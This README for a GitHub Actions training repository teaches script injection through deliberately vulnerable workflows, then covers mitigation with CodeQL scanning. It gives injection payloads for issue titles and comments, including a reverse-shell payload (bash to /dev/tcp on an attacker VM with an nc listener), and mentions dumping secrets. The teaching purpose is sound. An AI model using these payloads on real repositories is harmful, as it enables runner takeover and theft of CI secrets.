# workflow-script-injection

The [Check issue title](.github/workflows/check-issue-title.yml) workflow simply checks if the title of the workflow begins with `octocat`. If so, the workflow succeeds. If not, the workflow fails.

The [Check issue comment](.github/workflows/check-issue-comment.yml) workflow simply checks if the issue comment begins with `octocat`. If so, the workflow succeeds. If not, the workflow fails.

These workflows are vulnerable to script injection. Let's find out why.

## Exercise 1 - Script injection in the run command
The [Check issue title](.github/workflows/check-issue-title.yml) workflow uses the issue title in the `run` command as follows:
```
title="${{ github.event.issue.title }}"
```
This provides an opportunity for an attacker to exploit the workflow with an issue titled `octocat"; ls -l $GITHUB_WORKSPACE"`. Using this title, the script looks like the following...
```
title="octocat"; ls -l $GITHUB_WORKSPACE"
```

Let's create a new issue with this title and see what happens. We observe that the workflow runs the command `ls -l $GITHUB_WORKSPACE`!  

<img width="1042" alt="Screenshot 2023-08-30 at 7 38 43 PM" src="https://github.com/robandpdx/workflow-script-injection/assets/95243761/e3fa3917-2834-45cc-a297-d25614c3185e">

Ok. Big deal. So we were able to see what is in the workspace directory. Who cares?  
Now let's try something a little more sinister...

## Exercise 2 - Getting a shell on the runner
Spin up a linux vm in the cloud that has a public IP address. Login and run `nc -nvlp 1337`. Then open a new issue with the title `octocat"; bash -i >& /dev/tcp/<YOUR-VM-IP-ADDRESS>/1337 0>&1 ; ls -l $GITHUB_WORKSPACE"`  

Now I have a shell on the runner! This is a great "foot in the door" from which I can attemp other exploits, like dumping secrets or cloud credentials to use in other attacks.  

## Exercise 3 - Script injection in github-script action
The [Check issue comment](.github/workflows/check-issue-comment.yml) workflow uses issue comment body in the [github-script actions](https://github.com/actions/github-script) as follows:
```
const comment="${{ github.event.comment.body }}"
```
This provides an opportunity for an attacker to exploit the workflow with an issue comment `octocat";console.log('WTF!!!');//`. Using this title, the script looks like the following...
```
const comment="octocat";console.log('WTF!!!');//"
```

Let's create a new issue comment with this body and see what happens. We observe that the workflow runs the command `console.log('WTF!!!');//`!  

<img width="1034" alt="Screenshot 2023-08-30 at 9 07 51 PM" src="https://github.com/robandpdx/workflow-script-injection/assets/95243761/8730dc36-b596-4766-b24a-ec85209a6763">

## Exercise 4 - Mitigate script injection in the run command


## Exercise 5 - Migrate script injection in github-script action


## Exercise 6 - Mitigate using GitHub Action
### Creating an Actions workflow to scan Workflow files using CodeQL
In this section we are going to create an Actions workflow to scan existing workflows for any security weaknesses.

In your repository, `click` on the [`Actions`](../../actions) tab

_**NOTE:** If `Actions`tab is not available (this should not happen since you are looking to scan Actions workflows after all), please contact your organization admin or repository admin to enable it. See [enabling Actions section in the documentation](https://docs.github.com/en/enterprise-cloud@latest/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-github-actions-settings-for-a-repository) for more details._

This will take you to the `Actions` page and now click on the `new workflow` button to create a workflow. Alternatively, you can click [this link](../../actions/new).

This will put you in the `starter workflows` page. Enter `CodeQL Analysis` in the `Search` field and search. 
You should see one result. Click on `Configure` button on the resulting workflow template. This will take you to the edit window of the the workflow file.

_**NOTE:** If `CodeQl Analysis` search is not returning any results, code scanning might not be enabled for the repo, please contact your organization admin or repository admin to enable it. If you want to learn more about setting up code scanning, you can follow [this tutorial](https://learn.microsoft.com/en-us/training/modules/configure-code-scanning/2-what-code-scanning)._

Now we can edit this workflow to customize it to scan the workflows.

Give a name to the file (it could be `actions-workflow-codeql.yml`) and also give a name to the workflow (this could be `Actions WorkFlow CodeQL`)

At this point, you are close to having a CodeQL Workflow that can scan your repository for vulnerabitlities. 

Look over the first few lines of the workflow. You'd notice that the workflow gets triggered by `push` to the `default` branch and also by several other events.
Edit the workflow's trigger section as follows:
- Keep the `push` trigger
- Add `workflow_dispatch:`trigger.  
_**NOTE:** `workflow_dispatch` will give us the ability to run the scan on demand. As you are typing, Github will indicate if there are any errors in the workflow. You can just add a new line after `push: branches` section and add the new `workflow_dispatch:` trigger._
- Remove other trigger that were pre-configured in the workflow. 
- In the `strategy`:`matrix`: `language` section, type `'javascript'` as the value for lanuage array.
- Remove the `Autobuild` step entirely.  
_**NOTE:** Autobuild is only necessary for compiled languages, since we are using the `javascript` extractor, this is not really necessary._
- Commit this file into the `default`branch.

When the file is committed, it will generate a `push` event and the `Actions WorkFlow CodeQL` workflow should be triggered. Now `click` on the [`Actions`](../../actions) tab and you should see the workflow being scheduled to run based on the `push` event. 

Monitor the workflow run and ensure that it finishes successfully.

Now, click on the `Security` tab. And you should see the `Security Overview` page with _**two**_ alerts created under `Code Scanning` .

### Analysing and fixing the Alert
Click on `Code Scanning` in the side menubar of the `Security Overview` page. And click on the first alert - `Expression Injection in Actions`

You'll see the details of the alert including the file where this weakness exists. Click on `Show more` to see more details including how to resolve this alert.

Modify the problematic workflow file as suggested, and commit the changes.

Once the file is committed, it will trigger the `Actions Workflow CodeQL` and the alert should be resolved if the recommend fix was implemented.

